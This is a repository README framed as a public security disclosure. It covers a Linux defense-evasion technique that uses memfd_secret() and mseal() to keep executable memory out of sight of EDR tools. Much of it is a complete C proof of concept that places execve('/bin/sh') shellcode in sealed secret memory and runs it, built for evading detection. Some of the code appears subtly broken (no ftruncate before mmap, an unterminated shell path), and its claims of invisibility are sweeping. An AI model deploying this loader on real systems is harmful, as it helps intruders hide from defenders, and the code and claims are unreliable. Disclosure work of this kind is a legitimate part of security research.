# Counter-Attack-Injection-Method
Counter-Attack Injection Method


# BoxStrike · Finding 001

## Linux Defense Evasion: `memfd_secret()` + `mseal()`

**Date:** July 9, 2025  
**Author:** BoxStrike Research Team  
**Version:** 1.0  
**Status:** Public Disclosure

---

## 📌 Summary

A novel Linux Defense Evasion technique has been identified that combines two legitimate security system calls — `memfd_secret()` (Linux 5.14) and `mseal()` (Linux 6.10) — to create a memory region that is:

- **Invisible to kernel introspection** (eBPF, `/proc/<pid>/mem`, ptrace)
- **Immutable** (cannot be modified with `mprotect`, `munmap`, or `mremap`)
- **Usable without root privileges** (both syscalls can be called by unprivileged users)

An attacker can place shellcode (or any malicious payload) inside this hidden, sealed region within their own process, making it completely undetectable by EDR/XDR solutions that rely on eBPF or other kernel‑level visibility.

This is **not a vulnerability** in the traditional sense — it is a **design weakness** in the Linux kernel architecture that allows legitimate security features to be repurposed as evasion tools.

---

## 🔍 Technical Background

### `memfd_secret()` – Hiding Memory from the Kernel
- **Introduced:** Linux 5.14
- **Purpose:** Create memory regions that are inaccessible to anyone, including the kernel itself. Primarily designed to protect cryptographic keys and other sensitive data.
- **How it works:** The physical pages backing the region are **removed from the kernel's direct map and page tables**. The kernel can no longer see or access these pages.
- **Privilege:** No root or special capabilities required. Any user can call it.
- **Activation:** On kernels before 6.5, `secretmem.enable=1` boot parameter is required. On 6.5+, it is enabled by default.

### `mseal()` – Sealing a Memory Region
- **Introduced:** Linux 6.10
- **Purpose:** Protect a VMA (Virtual Memory Area) against future modifications. Prevents changes to protection bits (`mprotect`), unmapping (`munmap`), moving (`mremap`), or overwriting (`mmap` with `MAP_FIXED`).
- **How it works:** Adds the `VM_SEALED` flag to the VMA's `vm_flags`. Once set, all modification operations fail.
- **Privilege:** No root or special capabilities required.

---

## 💥 The Attack Vector

By combining these two features, an attacker can:

1. Create a secret memory region with `memfd_secret()`
2. Place shellcode (or any malicious payload) inside it
3. Seal the region with `mseal()` to prevent any later modification
4. Execute the shellcode directly from this hidden region

**Result:** The shellcode runs in a memory area that:
- Cannot be read by eBPF, `/proc/<pid>/mem`, or ptrace (due to `memfd_secret`)
- Cannot be modified or removed by security tools (due to `mseal`)
- Does not require root privileges to set up

This creates a **blind spot** for EDR/XDR solutions that rely on kernel‑based introspection.

---

## 📂 Proof‑of‑Concept (PoC)

The following PoC demonstrates the technique in action. It creates a secret, sealed memory region, copies `execve("/bin/sh")` shellcode into it, and executes it.

### `secret_shellcode_poc.c`

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <errno.h>

#ifndef __NR_memfd_secret
#define __NR_memfd_secret 447
#endif
#ifndef __NR_mseal
#define __NR_mseal 462
#endif

// x86_64 shellcode: execve("/bin/sh", NULL, NULL)
unsigned char shellcode[] = {
    0x48, 0x31, 0xc0,       // xor rax, rax
    0x48, 0x31, 0xd2,       // xor rdx, rdx
    0x48, 0x31, 0xf6,       // xor rsi, rsi
    0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, // mov rbx, /bin//sh
    0x53,                   // push rbx
    0x48, 0x89, 0xe7,       // mov rdi, rsp
    0xb0, 0x3b,             // mov al, 59
    0x0f, 0x05              // syscall
};

int main() {
    int fd;
    void *addr;

    // 1. Create a secret file with memfd_secret
    fd = syscall(__NR_memfd_secret, 0);
    if (fd == -1) {
        perror("memfd_secret");
        return 1;
    }

    // 2. Map the memory (read-write-execute)
    addr = mmap(NULL, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC,
                MAP_SHARED, fd, 0);
    if (addr == MAP_FAILED) {
        perror("mmap");
        close(fd);
        return 1;
    }

    // 3. Copy the shellcode into the secret region
    memcpy(addr, shellcode, sizeof(shellcode));

    // 4. Seal the region (optional; requires Linux 6.10+)
    if (syscall(__NR_mseal, addr, sizeof(shellcode), 0) == -1) {
        perror("mseal (warning, continuing)");
    } else {
        printf("[+] Shellcode sealed.\n");
    }

    printf("[+] Shellcode is in secret memory, executing...\n");
    // 5. Execute the shellcode
    ((void (*)())addr)();

    // Should never reach here (shellcode spawns a shell)
    return 0;
}
